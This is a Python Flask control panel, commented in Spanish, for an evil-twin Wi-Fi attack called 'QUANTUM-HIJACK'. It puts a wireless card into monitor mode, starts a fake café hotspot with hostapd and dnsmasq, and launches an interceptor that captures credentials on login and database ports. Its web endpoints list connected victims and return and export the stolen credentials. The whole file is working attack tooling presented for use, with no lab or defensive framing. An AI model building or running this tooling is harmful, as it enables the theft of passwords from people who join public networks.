#!/usr/bin/env python3
"""
QUANTUM-HIJACK v2.0 - ROGUE WIFI + INTERCEPTOR
Control centralizado del concepto completo
Backend que controla: setup.sh, hostapd, dnsmasq, interceptor.py, dashboard_terminal.py
"""

import os
import sys
import subprocess
import threading
import time
import json
import re
import socket
from datetime import datetime
from pathlib import Path
from flask import Flask, render_template, jsonify, request
from flask_cors import CORS

# ═══════════════════════════════════════════════════════════════════════════
# CONFIGURACIÓN
# ═══════════════════════════════════════════════════════════════════════════

app = Flask(__name__, template_folder='templates')
CORS(app)
app.config['JSON_SORT_KEYS'] = False

# Rutas de archivos
LOGS_DIR = "logs"
CREDENTIALS_FILE = f"{LOGS_DIR}/captured_credentials.json"
OPERATION_LOG = f"{LOGS_DIR}/operation_logs.json"
HOSTAPD_CONF = "hostapd_1.conf"
DNSMASQ_CONF = "dnsmasq.conf"

# Procesos activos
processes = {
    'setup': None,
    'hostapd': None,
    'dnsmasq': None,
    'interceptor': None,
    'dashboard': None
}

# Estado global
state = {
    'setup_done': False,
    'hostapd_running': False,
    'dnsmasq_running': False,
    'interceptor_running': False,
    'dashboard_running': False,
    'clients_connected': [],
    'credentials_captured': [],
    'operations_log': [],
    'wifi_interface': 'wlan0',
    'monitor_interface': 'wlan0mon',
    'ssid': 'CafeWiFi_Quantum',
    'password': '12345678',
    'gateway_ip': '192.168.1.1'
}

# ═══════════════════════════════════════════════════════════════════════════
# UTILIDADES
# ═══════════════════════════════════════════════════════════════════════════

def ensure_dirs():
    """Crea directorios necesarios"""
    Path(LOGS_DIR).mkdir(exist_ok=True)
    Path("payloads").mkdir(exist_ok=True)
    Path("capture").mkdir(exist_ok=True)

def log_operation(message, level="INFO"):
    """Registra operación"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] [{level}] {message}"
    
    print(log_entry)
    
    state['operations_log'].append(log_entry)
    
    # Guardar a JSON
    try:
        with open(OPERATION_LOG, 'w') as f:
            json.dump(state['operations_log'][-100:], f, indent=2)
    except:
        pass

def detect_wifi_interface():
    """Detecta automáticamente la interfaz WiFi"""
    try:
        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'interface' in line:
                iface = line.strip().split()[-1]
                state['wifi_interface'] = iface
                state['monitor_interface'] = f"{iface}mon"
                log_operation(f"Interfaz WiFi detectada: {iface}")
                return iface
    except Exception as e:
        log_operation(f"Error detectando interfaz: {e}", "ERROR")
    
    return 'wlan0'

def read_credentials():
    """Lee credenciales capturadas"""
    try:
        if os.path.exists(CREDENTIALS_FILE):
            with open(CREDENTIALS_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return []

def get_connected_clients():
    """Obtiene clientes conectados al WiFi rogue"""
    try:
        result = subprocess.run(['iw', 'dev', state['monitor_interface'], 'station', 'dump'],
                              capture_output=True, text=True, timeout=5)
        
        clients = []
        current_mac = None
        
        for line in result.stdout.split('\n'):
            if 'Station' in line:
                try:
                    current_mac = line.split('Station ')[1].split(' ')[0]
                    clients.append({
                        'mac': current_mac,
                        'ip': 'asignando...',
                        'connected_at': datetime.now().isoformat()
                    })
                except:
                    pass
        
        state['clients_connected'] = clients
        return clients
    except:
        return []

def kill_process_by_name(name):
    """Mata un proceso por nombre"""
    try:
        subprocess.run(['sudo', 'pkill', '-f', name], timeout=5)
        return True
    except:
        return False

# ═══════════════════════════════════════════════════════════════════════════
# MÓDULOS PRINCIPALES
# ═══════════════════════════════════════════════════════════════════════════

def init_setup():
    """Ejecuta setup.sh - Prepara antena a modo monitor"""
    log_operation("[INICIANDO] Setup - Modo Monitor", "PROCESS")
    
    try:
        detect_wifi_interface()
        
        log_operation(f"Bajando interfaz {state['wifi_interface']}...", "STEP")
        os.system(f"sudo ifconfig {state['wifi_interface']} down")
        time.sleep(1)
        
        log_operation("Matando procesos conflictivos...", "STEP")
        kill_process_by_name('hostapd')
        kill_process_by_name('dnsmasq')
        kill_process_by_name('wpa_supplicant')
        time.sleep(1)
        
        log_operation(f"Iniciando modo monitor en {state['wifi_interface']}...", "STEP")
        os.system(f"sudo airmon-ng start {state['wifi_interface']}")
        time.sleep(2)
        
        log_operation(f"Configurando interfaz {state['monitor_interface']}...", "STEP")
        os.system(f"sudo ifconfig {state['monitor_interface']} up")
        os.system(f"sudo ifconfig {state['monitor_interface']} 192.168.1.1 netmask 255.255.255.0")
        time.sleep(1)
        
        state['setup_done'] = True
        log_operation("[✓] Setup completado", "SUCCESS")
        return True
        
    except Exception as e:
        log_operation(f"Error en setup: {e}", "ERROR")
        return False

def init_hostapd():
    """Inicia hostapd - WiFi falso"""
    if not state['setup_done']:
        log_operation("Setup no completado", "ERROR")
        return False
    
    log_operation("[INICIANDO] Hostapd - WiFi Rogue", "PROCESS")
    
    try:
        # Actualizar config con interfaz correcta
        with open(HOSTAPD_CONF, 'r') as f:
            config = f.read()
        
        config = config.replace('wlan0mon', state['monitor_interface'])
        
        with open(HOSTAPD_CONF, 'w') as f:
            f.write(config)
        
        log_operation(f"Iniciando hostapd con {HOSTAPD_CONF}...", "STEP")
        
        processes['hostapd'] = subprocess.Popen(
            ['sudo', 'hostapd', HOSTAPD_CONF],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        time.sleep(2)
        
        if processes['hostapd'].poll() is None:
            state['hostapd_running'] = True
            log_operation(f"[✓] WiFi rogue ACTIVO: {state['ssid']} (pwd: {state['password']})", "SUCCESS")
            return True
        else:
            log_operation("Hostapd falló al iniciar", "ERROR")
            return False
            
    except Exception as e:
        log_operation(f"Error en hostapd: {e}", "ERROR")
        return False

def init_dnsmasq():
    """Inicia dnsmasq - DHCP"""
    if not state['setup_done']:
        log_operation("Setup no completado", "ERROR")
        return False
    
    log_operation("[INICIANDO] Dnsmasq - DHCP", "PROCESS")
    
    try:
        # Actualizar config
        with open(DNSMASQ_CONF, 'r') as f:
            config = f.read()
        
        config = config.replace('wlan0mon', state['monitor_interface'])
        
        with open(DNSMASQ_CONF, 'w') as f:
            f.write(config)
        
        log_operation(f"Iniciando dnsmasq con {DNSMASQ_CONF}...", "STEP")
        
        processes['dnsmasq'] = subprocess.Popen(
            ['sudo', 'dnsmasq', '-C', DNSMASQ_CONF, '-d'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        time.sleep(2)
        
        if processes['dnsmasq'].poll() is None:
            state['dnsmasq_running'] = True
            log_operation(f"[✓] DHCP ACTIVO: {state['gateway_ip']} → 192.168.1.2-100", "SUCCESS")
            return True
        else:
            log_operation("Dnsmasq falló al iniciar", "ERROR")
            return False
            
    except Exception as e:
        log_operation(f"Error en dnsmasq: {e}", "ERROR")
        return False

def init_interceptor():
    """Inicia interceptor.py - Captura de credenciales"""
    if not state['setup_done']:
        log_operation("Setup no completado", "ERROR")
        return False
    
    log_operation("[INICIANDO] Interceptor - Captura de Credenciales", "PROCESS")
    
    try:
        log_operation("Iniciando interceptor.py...", "STEP")
        
        processes['interceptor'] = subprocess.Popen(
            ['sudo', 'python3', 'interceptor.py'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        time.sleep(1)
        
        if processes['interceptor'].poll() is None:
            state['interceptor_running'] = True
            log_operation("[✓] Interceptor ACTIVO: Monitorando puertos 21,22,80,443,3306,5432,27017", "SUCCESS")
            return True
        else:
            log_operation("Interceptor falló al iniciar", "ERROR")
            return False
            
    except Exception as e:
        log_operation(f"Error en interceptor: {e}", "ERROR")
        return False

def init_dashboard():
    """Inicia dashboard_terminal.py - Mostrador vivo"""
    log_operation("[INICIANDO] Dashboard Terminal - Mostrador Vivo", "PROCESS")
    
    try:
        log_operation("Iniciando dashboard_terminal.py...", "STEP")
        
        processes['dashboard'] = subprocess.Popen(
            ['python3', 'dashboard_terminal.py'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        time.sleep(1)
        
        if processes['dashboard'].poll() is None:
            state['dashboard_running'] = True
            log_operation("[✓] Dashboard ACTIVO: Ver terminal separada", "SUCCESS")
            return True
        else:
            log_operation("Dashboard falló al iniciar", "ERROR")
            return False
            
    except Exception as e:
        log_operation(f"Error en dashboard: {e}", "ERROR")
        return False

# ═══════════════════════════════════════════════════════════════════════════
# API REST ENDPOINTS
# ═══════════════════════════════════════════════════════════════════════════

@app.route('/')
def dashboard():
    """Dashboard HTML"""
    return render_template('index_hijack.html')

@app.route('/api/status', methods=['GET'])
def api_status():
    """Estado actual del sistema"""
    return jsonify({
        'status': 'online',
        'timestamp': datetime.now().isoformat(),
        'setup_done': state['setup_done'],
        'modules': {
            'hostapd': state['hostapd_running'],
            'dnsmasq': state['dnsmasq_running'],
            'interceptor': state['interceptor_running'],
            'dashboard': state['dashboard_running']
        },
        'wifi': {
            'ssid': state['ssid'],
            'password': state['password'],
            'gateway': state['gateway_ip'],
            'interface': state['monitor_interface']
        },
        'clients': len(state['clients_connected']),
        'credentials': len(state['credentials_captured'])
    })

@app.route('/api/init/setup', methods=['POST'])
def api_init_setup():
    """Ejecutar setup"""
    result = init_setup()
    return jsonify({'success': result})

@app.route('/api/init/hostapd', methods=['POST'])
def api_init_hostapd():
    """Ejecutar hostapd"""
    result = init_hostapd()
    return jsonify({'success': result})

@app.route('/api/init/dnsmasq', methods=['POST'])
def api_init_dnsmasq():
    """Ejecutar dnsmasq"""
    result = init_dnsmasq()
    return jsonify({'success': result})

@app.route('/api/init/interceptor', methods=['POST'])
def api_init_interceptor():
    """Ejecutar interceptor"""
    result = init_interceptor()
    return jsonify({'success': result})

@app.route('/api/init/dashboard', methods=['POST'])
def api_init_dashboard():
    """Ejecutar dashboard terminal"""
    result = init_dashboard()
    return jsonify({'success': result})

@app.route('/api/init/all', methods=['POST'])
def api_init_all():
    """Ejecutar todo: Setup + Hostapd + Dnsmasq + Interceptor + Dashboard"""
    log_operation("[🔥] INICIANDO QUANTUM-HIJACK COMPLETO", "PROCESS")
    
    results = {
        'setup': init_setup(),
        'hostapd': init_hostapd(),
        'dnsmasq': init_dnsmasq(),
        'interceptor': init_interceptor(),
        'dashboard': init_dashboard()
    }
    
    if all(results.values()):
        log_operation("[✓✓✓] QUANTUM-HIJACK COMPLETAMENTE OPERACIONAL [✓✓✓]", "SUCCESS")
    
    return jsonify(results)

@app.route('/api/stop/all', methods=['POST'])
def api_stop_all():
    """Detener todo"""
    log_operation("[DETENIENDO] Todos los módulos...", "PROCESS")
    
    try:
        for proc_name, proc in processes.items():
            if proc and proc.poll() is None:
                proc.terminate()
                proc.wait(timeout=3)
                log_operation(f"[✓] {proc_name} detenido", "STEP")
                state[f'{proc_name}_running'] = False
    except:
        pass
    
    # Kill por nombre también
    kill_process_by_name('hostapd')
    kill_process_by_name('dnsmasq')
    
    log_operation("[✓] Todos los módulos detenidos", "SUCCESS")
    return jsonify({'success': True})

@app.route('/api/clients', methods=['GET'])
def api_clients():
    """Obtener clientes conectados"""
    clients = get_connected_clients()
    return jsonify({'clients': clients})

@app.route('/api/credentials', methods=['GET'])
def api_credentials():
    """Obtener credenciales capturadas"""
    state['credentials_captured'] = read_credentials()
    return jsonify({'credentials': state['credentials_captured']})

@app.route('/api/logs', methods=['GET'])
def api_logs():
    """Obtener logs de operación"""
    limit = request.args.get('limit', 100, type=int)
    return jsonify({'logs': state['operations_log'][-limit:]})

@app.route('/api/export', methods=['GET'])
def api_export():
    """Exportar datos completos"""
    export_data = {
        'timestamp': datetime.now().isoformat(),
        'state': state,
        'clients': get_connected_clients(),
        'credentials': read_credentials(),
        'logs': state['operations_log']
    }
    
    filename = f"export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    try:
        with open(filename, 'w') as f:
            json.dump(export_data, f, indent=2)
        log_operation(f"Datos exportados a {filename}", "SUCCESS")
    except:
        pass
    
    return jsonify(export_data)

# ═══════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════

def main():
    """Inicializar app"""
    ensure_dirs()
    
    print("\n" + "="*70)
    print("║" + " "*68 + "║")
    print("║" + "  🔓 QUANTUM-HIJACK v2.0 - ROGUE WIFI + INTERCEPTOR  ".center(68) + "║")
    print("║" + "  Control centralizado del concepto completo  ".center(68) + "║")
    print("║" + " "*68 + "║")
    print("="*70)
    print("")
    
    log_operation("Iniciando QUANTUM-HIJACK Backend...")
    
    # Verificar permisos root
    if os.geteuid() != 0:
        log_operation("⚠️  Este script requiere permisos root (sudo)", "WARNING")
    
    # Detectar interfaz
    detect_wifi_interface()
    
    print("\n" + "="*70)
    print("📡 CONFIGURACIÓN")
    print("="*70)
    print(f"  WiFi Interface: {state['wifi_interface']}")
    print(f"  Monitor Mode: {state['monitor_interface']}")
    print(f"  SSID: {state['ssid']}")
    print(f"  Password: {state['password']}")
    print(f"  Gateway: {state['gateway_ip']}")
    print("")
    
    print("🌐 WEB DASHBOARD")
    print("="*70)
    print(f"  → http://localhost:8080")
    print("")
    
    # Iniciar Flask
    try:
        app.run(host='0.0.0.0', port=8080, debug=False, threaded=True)
    except KeyboardInterrupt:
        log_operation("Servidor interrumpido", "INFO")
        api_stop_all()
        sys.exit(0)

if __name__ == '__main__':
    if os.geteuid() == 0:  # Solo si es root
        main()
    else:
        print("❌ Este script requiere permisos root")
        print("Ejecuta: sudo python3 quantum_hijack_full.py")
        sys.exit(1)
